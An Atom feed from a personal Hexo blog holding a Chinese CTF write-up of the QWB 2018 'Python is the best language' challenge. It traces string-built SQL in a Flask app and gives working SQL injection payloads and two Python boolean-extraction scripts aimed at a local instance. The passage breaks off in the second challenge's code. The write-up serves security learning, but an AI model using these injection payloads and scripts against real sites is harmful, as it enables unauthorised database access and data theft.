<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Kir[A]</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-04-16T04:59:21.044Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>kira</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>language</title>
    <link href="http://yoursite.com/2018/04/16/Python-is-the-best-language/"/>
    <id>http://yoursite.com/2018/04/16/Python-is-the-best-language/</id>
    <published>2018-04-16T04:57:09.000Z</published>
    <updated>2018-04-16T04:59:21.044Z</updated>
    
    <content type="html"><![CDATA[<p>本文纯属抄袭，如有改动，纯属手残。</p><p>原writeup见：</p><p><a href="http://skysec.top/2018/04/01/Python-is-the-best-language/#%E6%BA%90%E7%A0%81%E7%BB%93%E6%9E%84" target="_blank" rel="noopener">http://skysec.top/2018/04/01/Python-is-the-best-language/#%E6%BA%90%E7%A0%81%E7%BB%93%E6%9E%84</a></p><p><a href="https://xz.aliyun.com/t/2219#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/2219#toc-1</a></p><p><a href="https://lorexxar.cn/2018/03/26/qwb2018/#python-is-best-language" target="_blank" rel="noopener">https://lorexxar.cn/2018/03/26/qwb2018/#python-is-best-language</a></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pip install Flask</span><br><span class="line">pip install flask_login</span><br><span class="line">pip install flask_bootstrap</span><br><span class="line">pip install flask_moment</span><br><span class="line">pip install sqlalchemy</span><br><span class="line">sudo apt-get install libmysqlclient-dev</span><br><span class="line">pip install flask_wtf</span><br><span class="line">pip install MySQL-python</span><br></pre></td></tr></table></figure><p>创建数据库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE DATABASE `flask` DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;</span><br></pre></td></tr></table></figure></p><p>修改<code>config.py</code>中数据库账号密码，然后运行<code>python db_create.py</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQLALCHEMY_DATABASE_URI = <span class="string">"mysql://root:密码@127.0.0.1/flask?charset=utf8"</span></span><br></pre></td></tr></table></figure></p><p>修改<code>run.py</code>后运行<code>python run.py</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> app</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">30003</span>)</span><br></pre></td></tr></table></figure></p><h2 id="Python-is-the-best-language1"><a href="#Python-is-the-best-language1" class="headerlink" title="Python is the best language1"></a>Python is the best language1</h2><p>第一题是sql注入，重点关注以下文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">forms.py 用于表单登录，注册等</span><br><span class="line">models.py 放置操作数据库的代码</span><br><span class="line">others.py mysql操作语句等函数</span><br><span class="line">routes.py 路由文件</span><br></pre></td></tr></table></figure></p><h3 id="注入点一"><a href="#注入点一" class="headerlink" title="注入点一"></a>注入点一</h3><p>看看<code>routes.py</code>中注册代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/register', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    form = RegistrationForm()</span><br><span class="line">    <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">        res = mysql.Add(<span class="string">"user"</span>, [<span class="string">"NULL"</span>, <span class="string">"'%s'"</span> % form.username.data, <span class="string">"'%s'"</span> % form.email.data,</span><br><span class="line">                                 <span class="string">"'%s'"</span> % generate_password_hash(form.password.data), <span class="string">"''"</span>, <span class="string">"'%s'"</span> % now()])</span><br><span class="line">        <span class="keyword">if</span> res == <span class="number">1</span>:</span><br><span class="line">            flash(<span class="string">'Congratulations, you are now a registered user!'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'login'</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'register.html'</span>, title=<span class="string">'Register'</span>, form=form)</span><br></pre></td></tr></table></figure></p><p><code>forms.py</code>中注册的部分<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RegistrationForm</span><span class="params">(FlaskForm)</span>:</span></span><br><span class="line">    username = StringField(<span class="string">'Username'</span>, validators=[DataRequired()])</span><br><span class="line">    email = StringField(<span class="string">'Email'</span>, validators=[DataRequired(), Email()])</span><br><span class="line">    password = PasswordField(<span class="string">'Password'</span>, validators=[DataRequired()])</span><br><span class="line">    password2 = PasswordField(</span><br><span class="line">        <span class="string">'Repeat Password'</span>, validators=[DataRequired(), EqualTo(<span class="string">'password'</span>)])</span><br><span class="line">    submit = SubmitField(<span class="string">'Register'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate_username</span><span class="params">(self, username)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> re.match(<span class="string">"^[a-zA-Z0-9_]+$"</span>, username.data) == <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">'username has invalid charactor!'</span>)</span><br><span class="line">        user = mysql.One(<span class="string">"user"</span>, &#123;<span class="string">"username"</span>: <span class="string">"'%s'"</span> % username.data&#125;, [<span class="string">"id"</span>])</span><br><span class="line">        <span class="keyword">if</span> user != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">'Please use a different username.'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate_email</span><span class="params">(self, email)</span>:</span></span><br><span class="line">        user = mysql.One(<span class="string">"user"</span>, &#123;<span class="string">"email"</span>:  <span class="string">"'%s'"</span> % email.data&#125;, [<span class="string">"id"</span>])</span><br><span class="line">        <span class="keyword">if</span> user != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">'Please use a different email address.'</span>)</span><br></pre></td></tr></table></figure></p><p><code>validate_username</code>在进行<code>mysql.One</code>前进行了正则匹配的过滤和审核，而<code>validate_email</code>仅仅通过<code>validators=[DataRequired(), Email()]</code>来匹配。</p><p><code>Email()</code>的关键源码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">super(Email, self).__init__(<span class="string">r'^.+@([^.@][^@]+)$'</span>, re.IGNORECASE, message)</span><br></pre></td></tr></table></figure></p><p>其正则规则为<code>^.+@([^.@][^@]+)$</code>，也就是说对email而言，即使提交如<code>&#39;&quot;#a@qq.com</code>包含单引号，双引号，注释符等敏感字符的形式也是能通过的。</p><p>转到<code>others.py</code>中<code>mysql.One()</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">One</span><span class="params">(self, tablename, where=&#123;&#125;, feildname=[<span class="string">"*"</span>], order=<span class="string">""</span>, where_symbols=<span class="string">"="</span>, l=<span class="string">"and"</span>)</span>:</span></span><br><span class="line">    sql = self.Sel(tablename, where, feildname, order, where_symbols, l)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = self.db_session.execute(sql).fetchone()</span><br><span class="line">        <span class="keyword">if</span> res == <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span></span><br></pre></td></tr></table></figure></p><p>跟入<code>Sel()</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Sel</span><span class="params">(self, tablename, where=&#123;&#125;, feildname=[<span class="string">"*"</span>], order=<span class="string">""</span>, where_symbols=<span class="string">"="</span>, l=<span class="string">"and"</span>)</span>:</span></span><br><span class="line">    sql = <span class="string">"select "</span></span><br><span class="line">    sql += <span class="string">""</span>.join(i + <span class="string">","</span> <span class="keyword">for</span> i <span class="keyword">in</span> feildname)[:<span class="number">-1</span>] + <span class="string">" "</span></span><br><span class="line">    sql += <span class="string">"from "</span> + tablename + <span class="string">" "</span></span><br><span class="line">    <span class="keyword">if</span> where != &#123;&#125;:</span><br><span class="line">        sql += <span class="string">"where "</span> + <span class="string">""</span>.join(i + <span class="string">" "</span> + where_symbols + <span class="string">" "</span> +</span><br><span class="line">                                  str(where[i]) + <span class="string">" "</span> + l + <span class="string">" "</span> <span class="keyword">for</span> i <span class="keyword">in</span> where)[:<span class="number">-4</span>]</span><br><span class="line">    <span class="keyword">if</span> order != <span class="string">""</span>:</span><br><span class="line">        sql += <span class="string">"order by "</span> + <span class="string">""</span>.join(i + <span class="string">","</span> <span class="keyword">for</span> i <span class="keyword">in</span> order)[:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> sql</span><br></pre></td></tr></table></figure></p><p>最后拼接出来的sql语句如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id from user where email = &apos;your input email&apos;</span><br></pre></td></tr></table></figure></p><p>重新看一下<code>validate_email</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">validate_email</span><span class="params">(self, email)</span>:</span></span><br><span class="line">    user = mysql.One(<span class="string">"user"</span>, &#123;<span class="string">"email"</span>:  <span class="string">"'%s'"</span> % email.data&#125;, [<span class="string">"id"</span>])</span><br><span class="line">    <span class="keyword">if</span> user != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValidationError(<span class="string">'Please use a different email address.'</span>)</span><br></pre></td></tr></table></figure></p><p>数据库语言返回成功，会提示<code>Please use a different email address.</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kira&apos;/**/or/**/1=1#@qq.com</span><br></pre></td></tr></table></figure></p><p>提示：Please use a different email address.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kira&apos;/**/or/**/1=0#@qq.com</span><br></pre></td></tr></table></figure><p>什么都没返回</p><p>布尔注入脚本:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://127.0.0.1:30003/register"</span></span><br><span class="line"></span><br><span class="line">r = requests.get(url)</span><br><span class="line">soup = BeautifulSoup(r.text,<span class="string">"html5lib"</span>)</span><br><span class="line">token = soup.find_all(id=<span class="string">'csrf_token'</span>)[<span class="number">0</span>].get(<span class="string">"value"</span>)</span><br><span class="line"></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">"(SELECT/**/GROUP_CONCAT(schema_name)/**/FROM/**/INFORMATION_SCHEMA.SCHEMATA)"</span></span><br><span class="line">tables = <span class="string">"(SELECT/**/GROUP_CONCAT(table_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION_SCHEMA.TABLES/**/WHERE/**/TABLE_SCHEMA=DATABASE())"</span></span><br><span class="line">columns = <span class="string">"(SELECT/**/GROUP_CONCAT(column_name/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/INFORMATION_SCHEMA.COLUMNS/**/WHERE/**/TABLE_NAME=0x666c616161616167)"</span></span><br><span class="line">flag = <span class="string">"(SELECT/**/GROUP_CONCAT(flllllag/**/SEPARATOR/**/0x3c62723e)/**/FROM/**/flaaaaag)"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        payload = <span class="string">"test'/**/or/**/ascii(substr("</span>+ flag +<span class="string">",%d,1))=%d#@qq.com"</span> % (i,j)</span><br><span class="line">        <span class="keyword">print</span> payload</span><br><span class="line">        post_data = &#123;</span><br><span class="line">            <span class="string">'csrf_token'</span>: token,</span><br><span class="line">            <span class="string">'username'</span>: <span class="string">'a'</span>,</span><br><span class="line">            <span class="string">'email'</span>:payload,</span><br><span class="line">            <span class="string">'password'</span>:<span class="string">'a'</span>,</span><br><span class="line">            <span class="string">'password2'</span>:<span class="string">'a'</span>,</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Register'</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url,data=post_data)</span><br><span class="line">        soup = BeautifulSoup(r.text,<span class="string">"html5lib"</span>)</span><br><span class="line">        token = soup.find_all(id=<span class="string">'csrf_token'</span>)[<span class="number">0</span>].get(<span class="string">"value"</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Please use a different email address."</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            result += chr(j)</span><br><span class="line">            <span class="keyword">print</span> result</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p><h3 id="注入点二"><a href="#注入点二" class="headerlink" title="注入点二"></a>注入点二</h3><p>看看<code>routes.py</code>中修改profile代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/edit_profile', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_profile</span><span class="params">()</span>:</span></span><br><span class="line">    form = EditProfileForm(current_user.username)</span><br><span class="line">    <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">        current_user.username = form.username.data</span><br><span class="line">        current_user.note = form.note.data</span><br><span class="line">        res = mysql.Mod(<span class="string">"user"</span>, &#123;<span class="string">"id"</span>: current_user.id&#125;, &#123;</span><br><span class="line">                        <span class="string">"username"</span>: <span class="string">"'%s'"</span> % current_user.username, <span class="string">"note"</span>: <span class="string">"'%s'"</span> % current_user.note&#125;)</span><br><span class="line">        <span class="keyword">if</span> res != <span class="number">0</span>:</span><br><span class="line">            flash(<span class="string">'Your changes have been saved.'</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'edit_profile'</span>))</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        form.username.data = current_user.username</span><br><span class="line">        form.note.data = current_user.note</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'edit_profile.html'</span>, title=<span class="string">'Edit Profile'</span>,</span><br><span class="line">                           form=form)</span><br></pre></td></tr></table></figure></p><p><code>forms.py</code>中修改profile的部分<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">validate_note</span><span class="params">(self, note)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> re.match(<span class="string">"^[a-zA-Z0-9_\'\(\) \.\_\*\`\-\@\=\+\&gt;\&lt;]*$"</span>, note.data) == <span class="keyword">None</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValidationError(<span class="string">"Don't input invalid charactors!"</span>)</span><br></pre></td></tr></table></figure></p><p><code>validate_note</code>大部分敏感字符都没过滤</p><p>跟进Mod函数<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Mod</span><span class="params">(self, tablemame, where, values)</span>:</span></span><br><span class="line">    sql = <span class="string">"update "</span> + tablemame + <span class="string">" "</span></span><br><span class="line">    sql += <span class="string">"set "</span> + \</span><br><span class="line">        <span class="string">""</span>.join(i + <span class="string">"="</span> + str(values[i]) + <span class="string">","</span> <span class="keyword">for</span> i <span class="keyword">in</span> values)[:<span class="number">-1</span>] + <span class="string">" "</span></span><br><span class="line">    sql += <span class="string">"where "</span> + \</span><br><span class="line">        <span class="string">""</span>.join(i + <span class="string">"="</span> + str(where[i]) + <span class="string">" and "</span> <span class="keyword">for</span> i <span class="keyword">in</span> where)[:<span class="number">-4</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        self.db_session.execute(sql)</span><br><span class="line">        self.db_session.commit()</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure></p><p>最后拼接出来的sql语句如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update user set username=&apos;kira&apos;,note=&apos;your input note&apos; where id=1</span><br></pre></td></tr></table></figure></p><p>测试如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123&apos; and (select flllllag like binary 0x3125 from flaaaaag)  and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure></p><p>About me那里显示0</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123&apos; and (select flllllag like binary 0x5125 from flaaaaag)  and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p>About me那里显示1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">cookies = &#123;<span class="string">"session"</span>:<span class="string">"ca823fed-c8b9-450c-8ec9-fc7626ce8326"</span>&#125;</span><br><span class="line">url = <span class="string">"http://127.0.0.1:30003/edit_profile"</span></span><br><span class="line">r = requests.get(url=url,cookies=cookies)</span><br><span class="line">csrf_token_re = <span class="string">r'&lt;input id="csrf_token" name="csrf_token" type="hidden" value="(.*?)"&gt;'</span></span><br><span class="line">csrf_token = re.findall(csrf_token_re, r.content)[<span class="number">0</span>]</span><br><span class="line">note_re = <span class="string">r'&lt;input class="form-control" id="note" name="note" type="text" value="(\d)"&gt;'</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">"0123456789"</span>+string.letters+<span class="string">"!@#$^&amp;*()&#123;&#125;=+`~_"</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"csrf_token"</span>: csrf_token,</span><br><span class="line">            <span class="string">"username"</span>: <span class="string">"kira"</span>,</span><br><span class="line">            <span class="string">"note"</span>: <span class="string">"123' and (select flllllag like binary 0x&#123;&#125;25 from flaaaaag) and '1'='1"</span>.format((flag+j).encode(<span class="string">'hex'</span>)),</span><br><span class="line">            <span class="string">"submit"</span>: <span class="string">"Submit"</span></span><br><span class="line">        &#125;</span><br><span class="line">        r =requests.post(url=url,data=data,cookies=cookies,timeout=<span class="number">2.5</span>)</span><br><span class="line">        note_info = re.findall(note_re, r.content)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> note_info == <span class="string">'1'</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="注入点三"><a href="#注入点三" class="headerlink" title="注入点三"></a>注入点三</h3><p>看看<code>routes.py</code>中post内容的部分<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="meta">@app.route('/index', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    form = PostForm()</span><br><span class="line">    <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">        res = mysql.Add(<span class="string">"post"</span>, [<span class="string">'NULL'</span>, <span class="string">"'%s'"</span> % form.post.data,</span><br><span class="line">                                 <span class="string">"'%s'"</span> % current_user.id, <span class="string">"'%s'"</span> % now()])</span><br><span class="line">        <span class="keyword">if</span> res == <span class="number">1</span>:</span><br><span class="line">            flash(<span class="string">'Your post is now live!'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br></pre></td></tr></table></figure></p><p><code>forms.py</code>中<code>PostForm()</code>的部分<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PostForm</span><span class="params">(FlaskForm)</span>:</span></span><br><span class="line">    post = StringField(<span class="string">'Say something'</span>, validators=[DataRequired()])</span><br><span class="line">    submit = SubmitField(<span class="string">'Submit'</span>)</span><br></pre></td></tr></table></figure></p><p>啥过滤都没！<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(self, tablename, values)</span>:</span></span><br><span class="line">    sql = <span class="string">"insert into "</span> + tablename + <span class="string">" "</span></span><br><span class="line">    sql += <span class="string">"values ("</span></span><br><span class="line">    sql += <span class="string">""</span>.join(i + <span class="string">","</span> <span class="keyword">for</span> i <span class="keyword">in</span> values)[:<span class="number">-1</span>]</span><br><span class="line">    sql += <span class="string">")"</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        self.db_session.execute(sql)</span><br><span class="line">        self.db_session.commit()</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure></p><p>最后拼接出来的sql语句如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into post values (NULL,&apos;yout input&apos;,&apos;1&apos;,&apos;2018-04-15&apos;)</span><br></pre></td></tr></table></figure></p><p>构造payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123&apos;,&apos;1&apos;,&apos;2018-04-15&apos;),(NULL,(select flllllag from flaaaaag),&apos;1&apos;,&apos;2018-04-15&apos;)#</span><br></pre></td></tr></table></figure></p><p>flag出来了，问题是所有人都可以看到的，比赛中直接翻就能看到其他人注出来的flag，所以在注入时候需要加密一下。</p><p>这里可以使用mysql的<code>ENCODE(string,pass),DECODE(string,pass)</code>函数<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select hex(encode((select flllllag from flaaaaag),<span class="string">'kirakira'</span>));</span></span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| hex(encode((select flllllag from flaaaaag),'kirakira'))    |</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line">| 2240079E2A0C151347EF73F32460B6728EB6CDB1DBD8CE227801003C3F |</span><br><span class="line">+------------------------------------------------------------+</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select decode(unhex(<span class="string">'2240079E2A0C151347EF73F32460B6728EB6CDB1DBD8CE227801003C3F'</span>),<span class="string">'kirakira'</span>);</span></span><br><span class="line">+----------------------------------------------------------------------------------------+</span><br><span class="line">| decode(unhex('2240079E2A0C151347EF73F32460B6728EB6CDB1DBD8CE227801003C3F'),'kirakira') |</span><br><span class="line">+----------------------------------------------------------------------------------------+</span><br><span class="line">| QWB&#123;us1ng_val1dator_caut1ous&#125;                                                          |</span><br><span class="line">+----------------------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure></p><h2 id="Python-is-the-best-language2"><a href="#Python-is-the-best-language2" class="headerlink" title="Python is the best language2"></a>Python is the best language2</h2><p>接着下一题，在<code>others.py</code>里发现了奇怪的代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 